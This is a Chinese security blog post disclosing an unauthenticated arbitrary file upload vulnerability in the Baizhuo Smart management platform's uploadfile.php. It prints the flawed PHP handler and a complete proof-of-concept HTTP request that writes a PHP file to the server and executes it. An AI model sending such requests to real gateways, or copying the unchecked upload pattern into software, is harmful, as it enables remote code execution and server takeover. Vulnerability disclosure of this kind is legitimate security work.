---
title: "百卓Smart管理平台 uploadfile.php 文件上传漏洞"
source: https://mrxn.net/jswz/baizhuosmart-uploadfile-rce.html
asset_dir: assets/百卓smart管理平台-uploadfile.php-文件上传漏洞
---

# 百卓Smart管理平台 uploadfile.php 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/19 18:43
- 1262浏览
- [0评论](#comment)
- 16分钟阅读

深入探索

北京百卓网络技术有限公司

身份验证

百卓网络

---

# 漏洞简介

百卓Smart管理平台是北京百卓网络技术有限公司(以下简称百卓网络)的一款安全网关产品，是一家致力于构建下一代安全互联网的高科技企业。  
百卓Smart管理平台 `uploadfile.php` 接口存在任意[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "任意文件上传")漏洞。未经身份验证的攻击者可以利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")上传恶意后门文件，执行任意指令，从而获得服务器权限并操纵服务器文件。

漏洞扫描服务

# 漏洞分析

Tool/uploadfile.php 文件业务逻辑实现如下：

```
<?php
if(isset($_POST['txt_path']))
{
    if(!isset($_FILES['file_upload']) || !isset($_POST['txt_path']))
    {
        exit("上传的文件和绝对路径不能为空！<a href=uploadfile.php>后退</a>");
    }
    else
    {

        $upload_file = $_FILES['file_upload']['tmp_name'];

        $post_path = $_POST['txt_path'];

        if(!copy($upload_file,$post_path))
        {

            exit("上传失败,可能是没有写入的权限!");
        }
        echo "上传成功!<a href=uploadfile.php>后退</a>";
    }
}
?>
<html>
<head></head>
<body>
<form name=frm enctype="multipart/form-data" action="?" method="POST">
<div align="center">上传文件:<input type="file" name="file_upload" size="26"></div>
<br>
<div align="center">绝对路径:<input type="text" id="txt_path" name="txt_path" size="28">(写全文件名)
&nbsp;&nbsp;<input type="submit" value="确定">
</div>
<br>
</form>
</body>
</html>
```

深入探索

服务器安全服务

JSON处理工具

恶意软件分析工具

从 POST请求获取 `txt_path` 的值作为文件储存路径（需要一个可写权限的目录），上传里的filename随意，上传文件name部分为 `file_upload` 即可实现任意文件上传致RCE效果。

网络设备

# 漏洞复现

```
POST /Tool/uploadfile.php HTTP/1.1
Host: smart.mrxn.net
Content-Type: multipart/form-data; boundary=----123456

------123456
Content-Disposition: form-data; name="txt_path"

/home/test.php
------123456
Content-Disposition: form-data; name="file_upload"; filename="test.png"

<?=md5(123456);unlink(__FILE__);
------123456--
```

深入探索

授权

代码安全审计

防火墙软件

[![百卓Smart管理平台 uploadfile.php 文件上传漏洞](images/img-001-6db68ff2583d.webp)](https://image.mrxn.net/a9f0669c38624074810e3e53f619ce51.webp)

文件上传路径: `/home/test.php`

访问[上传文件](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0 "上传文件"),成功执行代码

安全运维咨询

[![百卓Smart管理平台 uploadfile.php 文件上传漏洞](images/img-002-51aaa8f8eb4e.webp)](https://image.mrxn.net/8796782214c14dccb5732831e193a2bb.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)
- [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.漏洞分析](#toc-2-)
- [3.漏洞复现](#toc-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
